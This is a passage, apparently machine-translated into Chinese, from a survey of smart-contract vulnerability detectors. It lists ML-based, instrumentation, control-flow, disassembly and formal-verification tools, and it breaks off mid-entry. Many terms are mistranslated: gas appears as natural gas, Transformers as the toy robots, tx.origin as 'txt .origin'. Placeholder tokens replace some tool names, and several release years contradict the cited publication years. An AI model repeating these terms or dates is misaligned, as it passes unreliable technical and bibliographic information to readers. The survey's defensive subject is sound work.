2021)：这是2021年设计的机器学习框架，用于检测以太坊sc中的“重入性”漏洞。它监控交易，并提取天然气使用和余额差异等特征，将其分类为良性或有害。Dynamit使用随机森林分类器来分析事务元数据，而不需要源代码或工具。\nEA-RGCN-detector (Chen et al., 2023)：它是2023年发布的一种用于SCs漏洞检测的新型图卷积网络模型，为每个函数构建语义图。利用残差图卷积网络和边缘关注模块提取内容和语义特征，识别漏洞，包括“算术”、“可重入”、“时间戳依赖”和“未检查的低调用”。\n基于集成模型的数字取证框架检测器（JJ et al., 2023）：这是2023年引入的一种使用自然语言处理和机器学习的新方法。它利用特征提取与集成建模相结合的混合系统对漏洞进行分类，包括“DoS”、“访问控制”、“算术整数溢出”、“坏随机性”、“可重入性”、“未检查的低级调用”和“时间戳依赖性”。该框架通过合成少数派过采样技术（SMOTE）和词频-逆文档频率（TF-IDF）、连续词袋（CBOW）和Skip-N Gram模型等技术提高了准确性并减少了误报。\n扩展的多模态AI框架检测器（Jie et al., 2023）：该工具于2023年开发，使用多模态AI方法在以太坊sc中进行漏洞检测。它结合了静态分析和各种人工智能模型来创建一个全面的框架。该工具利用基于构建的源代码数据和EVM字节码。它使用具有自关注的双向长短期记忆（bi-LSTM）、textCNN和随机森林等模型进行训练和推理。该框架支持带有或不带有源代码的契约，并且在特性融合技术方面表现出色。\nHGAT检测器（Ma et al., 2023a）：分层图注意网络（HGAT）利用分层图注意网络通过使用AST和CFG将函数抽象为代码图来检测SCs漏洞。该算法于2023年发布，利用图关注机制提取节点特征，拼接向量，检测“可重入性”、“时间戳依赖”、“整数溢出和下溢”等漏洞。\n基于dl的集成漏洞检测器（Jain and Tripathi, 2024）：于2023年推出，采用两步分层方法增强漏洞检测的特征提取。第一步使用变压器提取操作码关系，并使用双向门控循环单元（BiGRU）聚合顺序信息。第二步利用Text-CNN和空间注意力捕捉局部特征，强调重要的语义，以改进漏洞检测。它可以检测到13种类型的sc漏洞。这些漏洞包括“可重入性”、“访问控制”、“算术整数溢出&#x2F;下溢”、“低级调用的未检查返回值”、“拒绝服务”、“坏随机性”、“前端运行（TOCTOU）”、“时间操纵”、“短地址”、“调用堆栈”、“错误处理异常”、“事务顺序依赖”和“无保护地使用自毁”。\n基于ml的SCs漏洞检测器（Mughaid et al., 2023）：该模型于2023年推出，使用机器学习来识别有效和无效的SCs。通过采用k近邻（KNN）、朴素贝叶斯（Naive Bayes）、支持向量机（SVM）和随机森林等模型，它检测与事务相关的漏洞，包括“事务起源”、“check-effectsinteraction”、“潜在的重入错误”、“内联汇编”、“块时间戳”、“低级调用”、“块哈希”和“自毁交易商”。\nMSgram - detector (Yang et al., 2020a)：多语义图（MSgram）通过生成文本、结构和组合序列三种标记化标准的序列来增强SCs漏洞审计。MSgram于2020年开发，使用Ngram语言模型捕获多个语义上下文，并应用交集和联合策略整合来自不同语义角度的审计结果。它可以检测漏洞，包括“重入”，“时间戳依赖”，“整数溢出&#x2F;下溢”，“未检查的低级调用”，“自毁使用”，“调用堆栈深度”和“tx”。起源的使用”。\n多模态决策融合模型检测器（Deng et al., 2023）：该方法采用深度学习和多模态决策融合来检测sc中的漏洞。它从源代码、操作代码和控制流图中提取特征，并通过多模态决策融合对它们进行集成。该工具于2023年开发，可检测“算术漏洞”、“可重入性”、“TOD”和“锁定以太漏洞”。\nSC-Defender - detector (Mittal et al., 2023): SC-Defender于2023年发布，旨在检测支持物联网（IoT）的sc中的漏洞。它使用solid代码的AST和基于树的卷积神经网络（TBCNN）进行漏洞检测，特别关注“重入性”缺陷。该工具包括AST修剪技术，以去除多余的节点，提高检测效率。\nS-HGTNs检测器（Liu et al., 2022c）：空间异构图变压器网络（S-HGTNs）于2022年开发，是为以太坊上的sc欺诈而设计的异常检测模型。它构建了一个异构信息网络（HIN）利用变压器网络自动生成元路径，实现对金融欺诈、非法融资和洗钱行为的检测。\n基于语义ml的重入性检测器-检测器（Yan et al., 2022）：发布于2022年，它利用机器学习通过分析语义结构来检测sc中的“重入性”漏洞。该工具通过将AST数据与机器学习模型相结合来识别漏洞并提供纠正反馈。\nSG-EA-RGCN漏洞检测器（Yuan et al., 2023）：签名图实体对齐关系图卷积网络（SG-EA-RGCN）漏洞检测器是一种基于图的sc漏洞检测工具。它构建语义图，并使用残差GCNs与边缘关注分析和识别漏洞，包括“重入性”，“时间戳依赖性”，“tx”。“未检查发送”、“未处理异常”、“算术漏洞（溢出&#x2F;下溢）”和“TOD”。该方法于2023年开发，通过关注SCs代码中的关系和相互作用，可以精确检测。\nSVScanner - detector (Zhang et al., 2023d)：智能漏洞扫描器（SVScanner），于2023年发布，使用深度学习技术检测以太坊sc中的漏洞。它结合了代码令牌序列和AST功能，使用TextCNN进行有效的漏洞检测。它检测“重入性”漏洞、“整数错误”和“时间戳依赖”漏洞。\n使用LSTM网络检测器进行基于交易的分析（Hu等人，2021a）：该方法于2021年发布，重点是基于交易行为对恶意以太坊sc进行分类和检测。它使用LSTM网络来训练从合约交易中提取的特征模型，例如余额变化和以太流相关性。该工具根据交易行为检测庞氏骗局、赌博和高风险合约。\nABCNN - identifier (Sun and Gu, 2021): ABCNN于2021年推出，是一种基于注意力的CNN模型，旨在检测SCs漏洞。它将CNN与自关注机制相结合，提高了检测的准确性和速度。该模型对操作码序列进行预处理，并使用特征提取和分类层来识别“重入性”、“算术问题”和“时间操纵”等漏洞。\nASSBert - identifier (Sun et al., 2023): ASSBert于2023年引入，采用主动和半监督（ASS）学习结合来自变形金刚（BERT）模型的双向编码器表示。它使用主动学习有效地标记数据，并通过半监督学习提高模型性能。它解决了诸如“时间戳依赖性”、“调用深度问题”、“重入性”、“事务顺序依赖性”、“算术错误”和“tx”等漏洞。起源的使用”。\nAWD-LSTM - identifier (Gogineni et al., 2020)：平均随机梯度下降加权LSTM （AWD-LSTM）于2020年推出，使用LSTM模型的一种变体对sc进行分类，如自杀、浪子、贪婪和正常。该模型采用受自然语言处理技术启发的预训练编码器来提高分类效率。分析操作码序列可以解决诸如“调用深度”问题之类的漏洞\nAMEVulDetector - identifier (Liu et al., 2021)：细心的多编码器漏洞检测器（AMEVulDetector）于2021年提出，将深度学习与专家模式相结合，用于检测sc漏洞，包括“重入性”、“块时间戳依赖性”和“无限循环”。它采用自动工具提取专家模式，为代码构建语义图，并使用多编码器网络对图进行融合特性和模式，为特性的重要性提供可解释的权重。\nBiGAS检测模型-标识符（Zhang et al., 2023b）： BiGAS于2024年提出，将双向门控循环单元（BiGRU）与注意机制和支持向量机（SVM）相结合，用于检测SCs中的“重入性”漏洞。它将sc处理成标记序列，并使用功能模型提取和分类特征。\n带有注意力漏洞检测器-标识符的Bi-GRU (Jain and Tripathi, 2023)：该工具于2023年提出，该工具使用带有注意力机制的BiGRU来检测以太坊sc中的漏洞。它使用操作码序列提取和向量表示来关注“重入性”和“时间戳依赖”漏洞。该模型捕获上下文信息并强调输入序列的相关部分。\nBlass - identifier (Ren et al., 2023): Blass于2023年推出，使用带有注意机制的Bi-LSTM对sc漏洞进行分类。它针对诸如“可重入性”、“整数溢出”、“时间戳依赖”和“危险的委托调用”等问题。通过构建具有完整语义代码结构特征的程序切片，与传统方法相比，Blass显著提高了漏洞检测能力。\nCBGRU - identifier (Ren et al., 2023)：于2022年提出的卷积双向门控循环单元（Convolutional Bidirectional Gated Recurrent Unit， CBGRU），将CNN和BiGRU与Word2Vec和FastText词嵌入相结合，检测多个SCs漏洞。它关注的漏洞包括“无限循环”、“可重入性”、“时间戳依赖”、“调用堆栈深度攻击”、“整数溢出”和“整数下溢”。混合模型通过集成卷积和递归神经网络的能力来增强特征提取和分类。\nCGE - identifier (Liu et al., 2023b)：契约图嵌入（Contract Graph Embedding， CGE）于2023年提出，将GNN与专家知识相结合，用于SCs漏洞检测。它构造契约图来表示控制和数据流语义，通过规范化过程突出显示关键节点。该工具通过集成时间消息传播和安全模式特征来检测“重入性”、“时间戳依赖性”和“无限循环”漏洞。\nCider - identifier (Liu et al., 2022a): Cider于2022年提出，采用强化学习来推断契约不变量，专门用于证明sc中的算法安全性。它将不变量生成问题表述为马尔可夫决策过程，并使用神经策略来预测有价值的不变量。该工具通过减少运行时断言和提高推断不变量的质量来增强验证过程，特别是针对“算术溢出”漏洞。\nContractWard - identifier (Wang et al., 2021)：在2020年提出，ContractWard可以检测六种漏洞：“整数溢出”、“整数下溢”、“TOD”、“调用堆栈深度攻击”、“时间戳依赖”和“可重入性”。它采用从简化的操作代码中提取的双字特征，并利用XGBoost等五种机器学习算法来检测漏洞。ContractWard还设计用于检测快速批次。\n基于深度学习的漏洞检测器-标识符（Wu et al., 2022）：该工具于2022年提出，使用CNN、LSTM、CNN- bilstm等深度学习算法和残差网络检测SCs漏洞。它关注的漏洞包括“整数溢出”、“整数下溢”、“调用堆栈深度攻击”、“TOD”、“时间戳依赖”和“可重入性”。该工具通过单图和双图特征提取和修改词频-逆文档频率优化来提高检测性能。\nDeeSCVHunter - identifier (Yu et al., 2021b): Deep SCs Vulnerability Hunter （DeeSCVHunter）开发于2021年，是一种基于深度学习的框架，用于检测SCs中的“可重入性”和“时间依赖性”漏洞。它使用漏洞候选片（VCS）通过利用数据和控制依赖来增强检测。该框架包括cnn和循环神经网络（rnn）等模型，以学习漏洞模式。该工具的代码和数据集是公开的\nDL4SC - identifier (Liu et al., 2024)：发布于2024年的DL4SC是一种基于深度学习的框架，用于检测sc中的漏洞。它结合了转换器编码器和cnn来分析操作码序列，检测“重入性”、“算术”和“时间戳依赖性”漏洞。该工具使用麻雀搜索算法（SSA）优化超参数。数据集和工具是公开的。\nDR-GCN和TMP-identifier (Zhuang et al., 2020)：这些工具于2020年开发，利用gnn进行SCs漏洞检测。他们创建了捕获语法和语义方面的契约图。DR-GCN在这些图上使用无度卷积，而TMP使用时间消息传播来维护时间数据关系。他们的方法识别的漏洞包括“可重入性”、“时间戳依赖性”和“无限循环”。\nESCORT - identifier (Sendner et al., 2023)：高效SCs优化和风险工具（ESCORT）于2023年推出，是一种用于检测以太坊sc漏洞的深度学习工具。它使用一个通用的特征提取器和多个分支来检测各种漏洞类型，包括“重入性”、“整数溢出”、“整数下溢”、“调用堆栈深度攻击”、“事务顺序依赖”、“时间戳依赖”、“未检查发送”、“tx”。“Origin usage”、“断言冲突”、“可访问自毁”和“带函数类型变量的任意跳转”同时进行。ESCORT在字节码上运行，并支持迁移学习，以最少的数据添加新的漏洞类型，减少了对多种工具的需求，并最大限度地减少了检测时间。\nEth2Vec - identifier (Ashizawa et al., 2021)：以太坊字节码矢量（Eth2Vec）于2020年发布，是一种基于机器学习的静态分析工具，用于分析代码相似性以检测以太坊sc中的漏洞。它使用自然语言处理的神经网络自动学习EVM字节码的特征，使其对代码重写具有鲁棒性。\nHAM - identifier (Wu et al., 2023a)：混合注意机制（Hybrid Attention Mechanism， HAM）模型于2023年提出，利用单头和多头注意机制的组合来检测sc中的漏洞。HAM通过针对关键漏洞点提取代码片段，提高了对“重入性”、“算术漏洞”、“未检查返回值”、“时间戳依赖”和“tx”的检测精度。起源”问题。使用公共数据集来证明其有效性。\n基于机器学习的漏洞检测方案-标识符（Xing等人，2020年）：该工具于2020年提出，专注于检测以太坊sc中的三个特定漏洞：“短地址”，“流量”和“贪婪”。利用一种新颖的切片矩阵方法提取特征，提高了漏洞检测的准确性。该工具采用了各种机器学习模型，包括神经网络和随机森林，证明了其在GitHub公共数据集上的有效性。\nMANDO-GURU-identifier (Nguyen et al., 2022)：这个开源工具是为sc中的漏洞检测而设计的，利用异构图嵌入来分析控制流和调用图。MANDO-GURU于2022年发布，确定了七种类型的漏洞，包括“重入性”、“前跑”、“算术错误”、“控制流问题”、“调用图问题”，“符号执行错误”和“数据流漏洞”在行级和合同级。\nMODNN - identifier (Zhang et al., 2022b)：多目标检测神经网络（MODNN）是2022年开发的一种基于机器学习的工具，用于检测sc中的漏洞。它利用COS （critical Operation Sequence）进行特征提取，通过显式和隐式特征识别已知和未知漏洞。MODNN可以检测到12种类型的漏洞，包括“整数溢出和下溢”、“调用堆栈深度攻击”、“TOD”、“时间戳依赖”、“重入”、“未检查发送”、“tx”。“Origin”、“assert failure”和“block timestamp”，并支持多个漏洞的并行检测，提高了可扩展性，降低了培训成本。\n多任务学习漏洞检测模型-标识符（Huang et al., 2022）：该模型采用多任务学习框架来检测和识别sc中的漏洞。它于2022年推出，使用共享底层来学习语义信息，并与cnn一起使用特定任务层来进行检测和分类。该模型有效地处理了诸如“算术错误”、“可重入性”和“未知地址”等漏洞。\nRLRep - identifier (Guo et al., 2023): RLRep是一种基于强化学习的工具，于2024年推出，用于为SCs漏洞提供修复建议。它使用编码器-解码器模型和策略梯度算法来建议修复，而不需要大量标记数据。该工具有效识别并建议修复漏洞，包括“异常紊乱”、“整数溢出”、“可重入”、“TOD”和“txt .origin”。\nS-gram-identifier (Liu et al., 2018b): Sgram于2020年推出，是以太坊sc的语义感知安全审计工具。它利用一种新颖的S-gram模型来捕获契约代码中的语义模式以检测漏洞。通过分析令牌序列和对潜在漏洞进行排序，S-gram提供了全面的安全审计，识别复杂的漏洞，包括“重入性”、“整数溢出&#x2F;下溢”、“时间戳依赖”和“未检查的底层调用”，这些都是传统基于语法的工具可能忽略的。\nSCLMF - identifier (Yang et al., 2023b)：语义分类和元学习框架（SCLMF）于2023年引入，是一种基于元学习的框架，用于检测以太坊sc中的漏洞。它将字节码转换为RGB图像，并采用学习者-元学习者架构来执行少量学习。该模型利用cnn和模型不可知元学习（model - agnostic Meta-Learning， MAML）算法，在有限的数据下准确识别漏洞。\nSCVDIE - identifier (Zhang et al., 2022c): sc漏洞检测与集成集成（SCVDIE）是一种基于机器学习的工具，于2022年推出，利用神经网络集成来检测以太坊sc中的漏洞。结合CNN、RNN、transformer等模型，提高检测精度，主要针对“整数下溢”、“调用栈深度攻击”、“TOD”、“时间戳依赖”、“重入性”等漏洞。\nSecBERT - identifier (Vu et al., 2023)：安全增强的双向编码器表示（SecBERT）使用基于bert的架构进行sc中的多标签漏洞检测。它于2023年推出，使用预训练的SecBERT模型从字节码中提取特征，并使用MLP进行分类。\nsGuard -identifier (Gao et al., 2024): sGuard于2020年推出，是一种机器学习引导的自动漏洞修复工具。它使用二元分类模型，根据特征在功能级别检测每种类型的漏洞从sc的源代码和字节码中提取。该工具完善并扩展了sGuard的修复规则，保留了原有的业务逻辑，减少了天然气开销。\nSmartConDetect - identifier (Jeon et al., 2024): SmartConDetect是一个静态分析工具，用于检测solid sc中的安全漏洞。它于2023年发布，采用预训练的BERT模型来分析代码片段并识别易受影响的代码模式。该工具可检测出“气体耗尽”、“未检查函数调用”、“误用视图函数”、“误用纯函数”、“此”等23个漏洞。余额相等检查点”，“不正确的返回类型”，“msg。”“值零”、“误用可见性”、“数组长度操纵”、“使用不安全的数学函数”、“冗余回退拒绝”、“锁定醚”、“使用私有函数时数据泄漏”、“误用ERC20库中的批准函数”、“坚实编译器0.5.0版本错误”、“误用var”、“误用内部和私有函数中的多个返回值”、“误用循环中的传递函数”、“误用内联汇编”、“地址硬编码”、“废弃的结构”，“ERC20的错误返回”和“对revert require的滥用”。\nSmartEmbed - identifier (Gao et al., 2019a): SmartEmbed是一种通过结构代码嵌入来检测SCs克隆和错误的工具。它于2019年推出，使用深度学习和相似性检查技术来高效准确地识别代码克隆和与克隆相关的错误。该工具使用代码嵌入向量进行漏洞检测。\nSmartMixModel - identifier (Shakya et al., 2022): SmartMixModel是针对solididity SCs的基于机器学习的漏洞检测模型。它于2022年发布，利用高级语法和低级字节码特性来提高检测精度。该模型识别的漏洞包括“不安全的数组长度操纵”、“昂贵循环”、“锁定货币”、“使用txt .origin进行授权”、“严格检查余额相等性”、“冗余回退功能”、“硬编码地址”、“额外的gas消耗”、“发送而不是转移”、“循环内ETH转移”。\nslicing - jgnn - identifier (Cai et al., 2023b)：切片关节图神经网络（slicing - jgnn）使用GNN来检测sc中的漏洞，该网络于2023年引入。它结合了ast、控制流图和程序依赖图。采用程序切片的方法剔除无关信息，有效识别“块信息依赖”、“危险委托调用”、“整数溢出”、“重入”、“自杀式契约”、“短地址攻击”、“时间戳依赖”、“TODy”和“未检查调用返回值”等漏洞。\nTP-Detect - identifier (Srinivasan et al., 2023): triram PixelDetect （TP-Detect）是一种基于机器学习的漏洞检测工具，用于以太坊sc，它使用triram特征提取和像素值提取来创建一个全面的数据集。它于2023年推出，采用朴素贝叶斯和随机森林等模型识别漏洞，包括“整数下溢”、“调用堆栈深度攻击”、“事务顺序依赖”、“时间戳依赖”和“可重入漏洞”。\nVulDeeSmartContract - identifier (Qian et al., 2020)：漏洞深度sc （VulDeeSmartContract）在以太坊sc中使用BiLSTM和关注机制进行“重入检测”。它于2020年开发，分析合同片段以捕获基本语义信息和控制流依赖关系。\n\n\n总之，基于人工智能的工具提供了一种最先进的方法来准确识别SCs中的漏洞。通过使用先进的机器学习和深度学习技术，这些工具可以发现复杂的安全问题。讨论的工具突出了基于人工智能的方法在增强SCs的安全性和可靠性方面的优缺点。\n4.3. “代码插桩”工具第三类工具使用代码插装。该技术涉及修改sc的源代码或字节码，以插入用于监视、分析或安全性增强目的的附加代码。通过检测代码，这些工具可以检测漏洞，执行安全策略，并在不改变其预期功能的情况下确保合约的健壮性。以下是为sc中的代码检测开发的三种检测工具：\n\n\nHermHD检测器（Hou et al., 2023）： Hermes高密度（HermHD）是2023年设计的自动化安全增强工具，用于通过代码混淆保护以太坊sc。它使用六种混淆模式，包括控制流扁平化和各种指令级技术，在不影响功能的情况下重写字节码。HermHD通过防止反向静态分析工具破解合同来增强安全性。\n\nSMARTSHIELD - detector (Zhang et al., 2020a): SCs整流和屏蔽系统（SMARTSHIELD）于2020年开发，是一种自动字节码整流系统，旨在修复SCs中三种典型的安全漏洞：“外部调用后状态变化”、“超出边界的算术运算缺失检查”和“外部调用失败缺失检查”。通过分析和转换EVM字节码，同时保留语义并优化气体使用，SMARTSHIELD可确保安全的sc部署。\n\nsolanalyzer - detector (Akca et al., 2019)：发布于2019年，solanalyzer结合了静态和动态分析，用于Solidity sc中的自动漏洞检测。它使用带有断言的代码插装、自动输入生成和执行跟踪分析来检测漏洞。该工具支持八种不同的漏洞类型，并包括一个故障播种组件来评估其分析的有效性。它检测的漏洞包括“整数溢出&#x2F;下溢”、“除零”、“时间戳依赖”、“交易源误用”、“未检查发送”、“重复调用函数”和“排气条件”。\n\n\n\n总之，代码检测工具通过添加用于监视和执行的额外代码来增强SCs的安全性。上面讨论的工具演示了如何使用混淆、字节码纠正和静态-动态组合分析等多种方法来检测和预防关键漏洞。这些技术有效地平衡了合约功能的维护，同时引入了健壮的安全层。\n4.4. “控制流分析”工具第四类侧重于控制流分析。这种方法包括检查安全系统的控制流程，以识别潜在的漏洞和安全风险。通过构建控制流程图和分析执行路径，这些工具可以检测到可能危及合同安全性的关键问题。以下是为SCs控制流分析开发的两种检测工具：\n\n\nMadMax - detector (Grech et al., 2018): MadMax是一个静态程序分析工具，用于检测以太坊sc中以gas为中心的漏洞。它结合了基于控制流分析的反编译器和声明式程序结构查询。MadMax于2018年开发，分析SCs以捕获动态数据结构和安全可恢复循环等高级概念，有效识别“无界大规模操作”、“钱包悲伤”和“循环溢出”等漏洞。\nWaLi - detector (Yang et al., 2022): WaLi（开发于2022年）是一种基于控制流的分析器，用于检测Wasm sc中的安全漏洞。它从Wasm字节码构造一个控制流图，并识别可能包含漏洞的关键路径。WaLi使用Wasm虚拟机模拟运行时环境来跟踪这些路径，并根据预定义的模式检测诸如“访问控制漏洞”之类的漏洞。\n\n\n控制流分析工具是通过关注漏洞的执行路径来发现漏洞的关键。通过构建和分析控制流图，这些工具可以识别潜在的安全风险，如以气体为中心的漏洞和访问控制缺陷。本节重点介绍的工具演示了控制流分析如何有效地解决sc中的关键弱点。\n4.5. “反汇编分析”工具第五类涉及拆卸分析。该技术的重点是将sc的字节码分解为更可读的形式。通过反汇编字节码，这些工具有助于理解底层操作并检测潜在的漏洞。它们生成控制流图并将低级字节码转换为高级表示，从而促进全面的安全性分析。以下工具使用拆卸分析，前两个侧重于检测，另一个侧重于sc内的识别。\n\n\nOctopus - detector (FuzzingLabs, 2024): Octopus于2020年开发，是WebAssembly模块和区块链sc的开源安全分析框架，包括以太坊、比特币、EOS和NEO。它提供了字节码反汇编、控制流、调用流分析和符号执行。Octopus通过生成控制流图和将字节码转换为高级静态单赋值（SSA）形式来提供全面的分析。\nPorosity检测器（Suiche, 2017）：Porosity是2017年开发的EVM字节码的开源反编译器。它将EVM字节码转换为可读的Solidity语法，帮助进行静态和动态分析。此工具可检查已编译的sc，透过生成更容易理解的代码，帮助识别漏洞，包括“可重入漏洞&#x2F;竞争条件”、“调用堆栈漏洞”和“时间依赖漏洞”。\netherproof - identifier （Linoy等人，2021年）：发布于2021年，etherproof是一种来源感知工具，结合了静态和动态分析来检测、分析和缓解安全问题，包括以太坊sc中的“液体以太”、“重入”和“限制写入”。它使用CFG工具和数据查询来进行高效的安全性分析。EtherProv可以识别多个合约和交易历史中的漏洞，为部署的合约提供实时缓解。\n\n\n反汇编分析工具通过将复杂的字节码转换为更易于理解的表示形式，提供了对sc的深入了解。这些工具通过分解低级代码和生成控制流图来促进漏洞的检测和分析。本节介绍的工具强调了反汇编分析如何通过使开发人员更好地了解潜在风险来增强sc的安全性。\n4.6. “合规验证”工具第六类工具围绕形式验证和定理证明展开。该方法使用数学证明和逻辑推理来确保SCs遵守其预期的规范和行为。通过将SCs转换为正式模型，并根据精确的标准进行验证，这些工具有助于保证合同的有效性，正确性和安全性。在为形式验证和定理证明开发的工具中，前8个用于检测，其余17个侧重于sc中的漏洞识别。\n\n\nCelestial-detector (Dharanikota et al., 2021)：这是2021年开发的一个框架，用于使用&lt;s:1&gt;百科-验证solid sc。它将契约转换为针对区块链语义的格式验证，然后擦除规范以生成可部署的solid代码。Celestial通过自动化验证过程和为开发人员提供较低的入门门槛来确保功能的正确性。\nConCert - detector (Nielsen et al., 2023): ConCert是一个使用Coq验证sc的框架，侧重于功能正确性和安全性。它允许提取经过验证的合同，以CameLIGO等语言执行区块链代码。ConCert于2020年推出，支持对合约交互进行推理，使其适用于复杂的分散应用程序。使用Coq的证明辅助功能有助于检测与功能正确性和安全属性相关的漏洞。\nEther - detector(Yang and Lei, 2019)：正式以太（FEther）是一个可扩展的定义解释器，于2019年发布，用于Coq中的以太坊sc验证。它结合了符号执行和高阶逻辑定理，证明了sc与其形式模型之间的一致性。FEther具有执行和验证的自动策略，在Coq中具有经过验证的功能正确性。\nHoRStify - detector (Holler et al., 2023)：敌意抵抗静态分析（HoRStify），于2023年开发，是一个完善的以太坊sc静态分析工具，专注于依赖分析以验证安全属性。它使用正式的证明框架进行静态程序切片和逻辑编码。这确保了sc中“时间戳依赖”和“单入口”等漏洞的检测。\nNuSMV模型检查框架检测器（Nehaïet al., 2018）：该工具于2018年开发，采用模型检查技术来验证以太坊sc的正确性。将solid代码翻译成新符号模型验证器（NuSMV）输入语言并使用时间逻辑形式化属性计算树逻辑（CTL）系统地检查所有可能的状态序列，以确保符合指定的行为属性。这个框架有助于检测与“状态可达性”、“安全属性”、“活动性”和“功能正确性”相关的漏洞。\nPROMELA和SPIN模型检查框架检测器（Osterland和Rose， 2020）：该框架于2020年推出，采用简单PROMELA解释器（SPIN）模型检查器，通过将solid代码翻译成过程元语言（PROMELA）模型来验证sc的正确性。它使用断言、死锁检测和线性时序逻辑（LTL）系统地根据指定的属性检查契约的逻辑。\nsafevm检测器（Albert et al., 2019a）：它是为以太坊sc设计的验证工具，使用最先进的C程序验证引擎。它将EVM字节码反编译为带有SV-COMP验证注释的C代码，允许像CPAchecker、SeaHorn和VeryMax这样的工具进行验证。SAFEVM于2019年推出，有效处理“一般安全注释”和“数组访问验证”，通过将无效字节码操作转换为可验证的C程序断言，提供sc安全性的全面分析。\nVeriMove检测器（Keilty et al., 2022）： VeriMove（2022）是一个模型检查框架，旨在验证Move sc。建立在VeriSolid框架之上，VeriMove将其功能扩展到Move语言，允许跨多个函数执行验证全局属性。该框架主要针对“可重入性”和“整数溢出&#x2F;下溢”等漏洞。\n2Vyper - identifier (Bräm等人，2021):2Vyper是一个基于2021可满足模理论（SMT）的以太坊sc自动验证工具，用Vyper编写。它使用了一种为SCs量身定制的新颖规范方法，即使在未经验证的代码和任意的“重新进入”中也能进行合理而精确的推理。该工具支持关于协作契约的模块化推理。它包括特定于领域的资源和资源传输规范。\nEtherTrust - identifier (Grishchenko et al., 2018): EtherTrust于2018年提出，是以太坊字节码的可靠静态分析工具。它使用基于horn子句解析的可达性分析技术来检测诸如“重入性”和“事务环境依赖性”等关键漏洞。\neThor - identifier (Schneidewind et al., 2020): eThor于2020年发布，是以太坊sc的一个健全和自动化的静态分析器。它使用基于horn条款的可达性分析来检测诸如“单入口”之类的安全属性。eThor提供了正式的安全保证，并支持EVM字节码的分析，在现实世界的合约上展示了大规模评估的准确性。\nesbmc - solid - identifier (Song et al., 2022): ESBMC-Solidity于2022年推出，是一种基于smd的Solidity sc模型检查器。它使用一个新的前端将Solidity JSON AST转换为符号执行的IR。该工具对“整数溢出”、“整数下溢”、“通过txt .origin授权”、“静态数组越界”、“动态数组越界”等漏洞进行验证，并针对检测到的每个问题提供反例。\nFSPVM-E - identifier (Yang et al., 2020b): Formal Symbolic Process Virtual Machine for Ethereum (FSPVM-E)，发布于2020年，是在Coq中实现的以太坊sc的混合形式验证系统。它将符号执行和高阶逻辑定理证明相结合，利用FSPVM来保证sc的可靠性和安全性。FSPVM-E包括一个正式的内存框架、一个中间编程语言（Lolisa）和一个经过正式验证的解释器（FEther）。它可以检测“整数溢出”、“堆栈溢出”、“未检查发送错误”、“除零”等漏洞。\n（Bhargavan et al., 2016）：发布于2016年，是一种正式的验证工具，可以将以太坊sc转换为用于综合分析的&lt;s:2&gt; -百科函数式编程语言。它支持Solidity源代码和EVM字节码，允许通过形式化方法和关系推理进行运行时安全性和功能正确性验证。\n基于谓词抽象的验证框架-标识符（Godoy等人，2022）：该工具使用谓词抽象通过从合同代码构建有限标记转换系统来验证sc。它于2022年发布，通过识别函数调用序列和检查合同行为与需求之间的对应关系来支持审计人员。该工具可以通过使用基于所需子句和枚举类型状态变量的谓词来暴露缺陷。\nsecurity - identifier (Tsankov et al., 2018): Securify是以太坊sc的实用且可扩展的安全分析器，于2018年推出。此静态分析工具使用遵从性和违例模式来验证安全属性并有效地检测违例。通过对合约的依赖关系图进行符号编码，Securify有助于识别诸如“重入性”、“无限制写入存储”、“锁定以太坊”、“TOD”、“异常处理”、“未检查调用返回值”和“整数溢出&#x2F;下溢”等问题，并将误报最小化。\nSmartFast - identifier (Li et al., 2022c): SmartFast是以太坊sc的形式化分析工具。它引入了一种新的中间表示，SmartIR，它使用预设规则和污点跟踪来识别和定位合同代码中的漏洞。SmartFast于2022年开发，能够以高精度和召回率检测各种漏洞。这些漏洞可分为15类，包括“可重入性和调用漏洞”、“访问控制和授权”、“状态管理和初始化”、“逻辑和计算问题”、“数学错误”、“合同设计和标准”、“安全最佳实践”、“SCs标准遵从性”、“气体优化和成本管理”、“代码质量和可读性”、“数据处理和逻辑流”、“执行和功能”、“错误处理和恢复”，“汇编和低级操作”，以及“杂项问题”。\nSolc-verify - identifier (Hajdu and jovanoviki, 2020): Solc-verify是以太坊sc的源代码级验证工具。它于2020年发布，使用模块化程序分析和SMT求解器通过直接分析源代码中的注释来验证Solidity合约。它检测各种漏洞，如“可重入性”、“溢出”和“断言失败”。\nSolicitous - identifier (Marescotti et al., 2020): Solicitous是集成到官方Solidity编译器中的正式验证工具。它于2020年推出，使用受限的Horn子句（CHCs）来准确地模拟SCs的行为，允许使用泛型定理证明器进行全自动验证。Solicitous擅长于证明“无界安全属性”和生成违反属性的反例。\n固化标识符（Antonino和Roscoe， 2021）：固化是Solidity sc的有界模型检查器，它使用延迟契约部署和精确内存建模。它于2021年推出，使用Boogie（一种中间验证语言）对Solidity和以太坊区块链进行编码。该工具通过探索语义属性而不是特定模式来解决漏洞，从而确保精确和格式良好的状态操作。\nVandal - identifier （Brent等人，2018年）：Vandal于2018年发布，是以太坊sc的安全分析框架，可将低级EVM字节码转换为语义逻辑关系。它使用基于数据的逻辑规范来检测漏洞，包括“未经检查的发送”、“可重入”、“不安全的余额”、“可销毁的合约”和“使用起源”。Vandal的逻辑驱动方法允许对新的漏洞分析进行轻松定制和快速原型化。\nVERISMART - identifier (So et al., 2020): VERISMART是以太坊sc的安全验证器，专注于“算术安全”。它于2020年推出，使用一种新的特定于领域的算法来自动发现事务不变量，确保在不影响精度或可扩展性的情况下进行详尽的验证。VERISMART有效地检测漏洞，如“整数溢出和下溢”，减少误报。\nVERISOL - identifier (Wang et al., 2018): VERISOL是Azure区块链中sc的正式验证器，于2019年推出。它将Solidity程序翻译成Boogie中间验证语言，利用Boogie验证管道执行语义一致性检查和自动验证。VERISOL已被用于查找Azure区块链工作台的契约中以前未知的错误。\nVeriSolid - identifier (Mavridou et al., 2019): VeriSolid是一个正式验证以太坊sc的框架，使用具有严格操作语义的基于过渡系统的模型。它于2019年推出，允许开发人员在高层次抽象上推理和验证合约行为。VeriSolid能够从经过验证的模型中生成Solidity代码，从而促进sc的正确设计开发。它可以检测诸如“重入性”、“TOD”、“整数溢出&#x2F;下溢”、“访问控制问题”和“死锁自由”等漏洞。\nZEUS - identifier (Kalra et al., 2018): 